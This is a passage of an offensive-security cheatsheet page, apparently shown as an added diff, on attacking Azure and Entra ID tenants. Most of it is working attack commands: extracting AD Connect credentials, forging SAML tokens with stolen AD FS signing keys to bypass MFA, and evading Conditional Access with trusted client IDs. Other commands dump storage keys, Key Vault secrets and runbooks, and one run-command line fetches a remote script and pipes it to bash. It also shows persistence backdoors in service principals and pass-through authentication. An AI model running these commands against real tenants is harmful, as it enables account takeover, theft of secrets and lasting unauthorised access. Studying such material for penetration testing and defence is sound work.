+</span></span><span class="line"><span class="cl"><span class="c1">## Or AADInternals:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## On the AD Connect host:</span>
+</span></span><span class="line"><span class="cl">Get-AADIntSyncCredentials
+</span></span></code></pre></div><h3 id="federated-domain-takeover-via-token-signing-key" data-heading-permalink="true"><span class="heading-content">Federated domain takeover via token signing key</span>
+    <a class="heading-permalink" href="#federated-domain-takeover-via-token-signing-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If you have Global Admin or compromise the AD FS server, extract the signing key. Forge SAML tokens that bypass all Entra auth:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## On AD FS server:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cert</span> <span class="p">=</span> <span class="nb">Get-AADIntADFSCertificate</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="nb">Get-AADIntADFSSigningKey</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Forge token as any user:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Open-AADIntOffice365Portal</span> <span class="n">-ImmutableID</span> <span class="n">xyz</span> <span class="n">-Issuer</span> <span class="s2">&#34;http://target.com/adfs/services/trust/&#34;</span> <span class="n">-ByPassMFA</span>
+</span></span></code></pre></div><h3 id="conditional-access-bypass-via-device-code-flow" data-heading-permalink="true"><span class="heading-content">Conditional Access bypass via Device Code Flow</span>
+    <a class="heading-permalink" href="#conditional-access-bypass-via-device-code-flow" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Many Conditional Access policies don&rsquo;t apply to &ldquo;trusted&rdquo; client IDs (Office, Teams, OneDrive). Use those client IDs in your device code request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Microsoft Office client:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">client_id</span><span class="o">=</span>d3590ed6-52b3-4102-aeff-aad2292ab01c
+</span></span><span class="line"><span class="cl"><span class="c1">## Azure CLI:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">client_id</span><span class="o">=</span>04b07795-8ddb-461a-bbee-02f9e1bf7b46
+</span></span><span class="line"><span class="cl"><span class="c1">## Teams:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">client_id</span><span class="o">=</span>1fec8e78-bce4-4aaf-ab1b-5451cc387264
+</span></span></code></pre></div><h2 id="x-service-specific-storage-vms-functions-key-vaults" data-heading-permalink="true"><span class="heading-content">x. Service-specific: storage, VMs, functions, key vaults</span>
+    <a class="heading-permalink" href="#x-service-specific-storage-vms-functions-key-vaults" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="storage-account-keys" data-heading-permalink="true"><span class="heading-content">Storage Account keys</span>
+    <a class="heading-permalink" href="#storage-account-keys" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## List storage accounts:</span>
+</span></span><span class="line"><span class="cl">az storage account list --query <span class="s1">&#39;[].[name,resourceGroup]&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Get account keys (often gives full data plane access):</span>
+</span></span><span class="line"><span class="cl">az storage account keys list --account-name STORAGE -g RG
+</span></span><span class="line"><span class="cl"><span class="c1">## Use key for blob enum:</span>
+</span></span><span class="line"><span class="cl">az storage container list --account-name STORAGE --account-key KEY
+</span></span></code></pre></div><h3 id="virtual-machines-run-command-as-system" data-heading-permalink="true"><span class="heading-content">Virtual Machines: run command as SYSTEM</span>
+    <a class="heading-permalink" href="#virtual-machines-run-command-as-system" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>With <code>Microsoft.Compute/virtualMachines/runCommand/action</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az vm run-command invoke -g RG -n VMNAME --command-id RunPowerShellScript <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --scripts <span class="s2">&#34;Get-Process; whoami; ipconfig /all&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Or:</span>
+</span></span><span class="line"><span class="cl">az vm run-command invoke -g RG -n VMNAME --command-id RunShellScript <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --scripts <span class="s2">&#34;curl http://10.10.14.1/sh.sh | bash&#34;</span>
+</span></span></code></pre></div><h3 id="function-apps-and-app-services" data-heading-permalink="true"><span class="heading-content">Function Apps and App Services</span>
+    <a class="heading-permalink" href="#function-apps-and-app-services" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Read function code (often has connection strings):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az functionapp list-keys --resource-group RG --name FUNC
+</span></span><span class="line"><span class="cl">az functionapp config appsettings list -g RG -n FUNC
+</span></span></code></pre></div><h3 id="key-vault" data-heading-permalink="true"><span class="heading-content">Key Vault</span>
+    <a class="heading-permalink" href="#key-vault" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az keyvault list
+</span></span><span class="line"><span class="cl">az keyvault secret list --vault-name KV
+</span></span><span class="line"><span class="cl">az keyvault secret show --vault-name KV --name SECRET
+</span></span></code></pre></div><p>Need <code>Get</code> or <code>List</code> permission on the data plane. If you have <code>set</code> on access policies, grant yourself those permissions first:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az keyvault set-policy --name KV --upn user@target.com --secret-permissions get list
+</span></span></code></pre></div><h3 id="automation-accounts" data-heading-permalink="true"><span class="heading-content">Automation Accounts</span>
+    <a class="heading-permalink" href="#automation-accounts" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Often store credentials as Automation variables and contain Runbook code with hardcoded secrets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az automation account list
+</span></span><span class="line"><span class="cl">az automation account show -n AUTOACCT -g RG
+</span></span><span class="line"><span class="cl"><span class="c1">## Read Runbook:</span>
+</span></span><span class="line"><span class="cl">az automation runbook show-content -n RB --automation-account-name AUTOACCT -g RG
+</span></span></code></pre></div><h2 id="xi-persistence" data-heading-permalink="true"><span class="heading-content">xi. Persistence</span>
+    <a class="heading-permalink" href="#xi-persistence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="service-principal-with-api-permissions" data-heading-permalink="true"><span class="heading-content">Service Principal with API permissions</span>
+    <a class="heading-permalink" href="#service-principal-with-api-permissions" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Create an SP, give it <code>RoleManagement.ReadWrite.Directory</code> and admin-consent:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az ad sp create-for-rbac --name pwn-sp
+</span></span><span class="line"><span class="cl"><span class="c1">## Note the appId and password</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Then the SP can be granted Graph permissions and assigned to any role</span>
+</span></span></code></pre></div><h3 id="backdoor-existing-sp" data-heading-permalink="true"><span class="heading-content">Backdoor existing SP</span>
+    <a class="heading-permalink" href="#backdoor-existing-sp" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Add a second credential (client secret or certificate) to an existing high-priv SP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az ad sp credential reset --id APP_ID --append
+</span></span><span class="line"><span class="cl"><span class="c1">## --append keeps existing secrets active</span>
+</span></span></code></pre></div><h3 id="federation-backdoor" data-heading-permalink="true"><span class="heading-content">Federation backdoor</span>
+    <a class="heading-permalink" href="#federation-backdoor" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>On AD FS or external IdP, forge tokens for any tenant user as long as the trust remains. AADInternals <code>Open-AADIntOffice365Portal</code> patterns. Persistent until federation is removed.</p>
+<h3 id="pass-through-auth-backdoor" data-heading-permalink="true"><span class="heading-content">Pass-through Auth Backdoor</span>
+    <a class="heading-permalink" href="#pass-through-auth-backdoor" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If pass-through auth (PTA) is enabled and you control the on-prem PTA agent host, you can intercept every Entra login. AADInternals has <code>Install-AADIntPTASpy</code>.</p>
+<h2 id="xii-detection" data-heading-permalink="true"><span class="heading-content">xii. Detection</span>
+    <a class="heading-permalink" href="#xii-detection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Sign-in logs and Audit logs in Entra ID record almost everything. Common monitoring:</p>
+<ul>
+<li>Suspicious sign-in patterns (impossible travel, anonymous IP, atypical location)</li>
+<li>Privileged role activation (PIM logs)</li>
+<li>Application permission grants</li>
+<li>Mass-data-export from Graph</li>
+</ul>
+<p>Quick checks for your own footprint:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Most recent sign-ins for yourself:</span>
+</span></span><span class="line"><span class="cl">az ad signed-in-user show
+</span></span><span class="line"><span class="cl"><span class="c1">## Audit log (requires Audit.Read.All):</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?\$top=20&#34;</span>
+</span></span></code></pre></div><h2 id="xiii-decision-tree" data-heading-permalink="true"><span class="heading-content">xiii. Decision tree</span>
+    <a class="heading-permalink" href="#xiii-decision-tree" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You have a token / creds, now what?</p>
+<ol>
+<li><code>az account show</code> and <code>az ad signed-in-user show</code> - what identity?</li>
+<li><code>roadrecon gather</code> to map everything you can see</li>
+<li>AzureHound for BloodHound graphing</li>
+<li>Look for: SP with high API perms, RBAC Owner roles, group memberships (Global Admin, Application Admin)</li>
+<li>Hybrid setup? → AD Connect host is the dream target</li>
+<li>No direct privesc? → enumerate storage / Key Vault / Automation for stored secrets</li>
+<li>Persistence → add SP credential, or admin-consent a privileged SP</li>
+</ol>
+<p>For on-prem AD attacks against hybrid setups, see <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">00 AD MOC</a>
+.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/cloud/aws/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">AWS</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/cloud/gcp/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">GCP</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
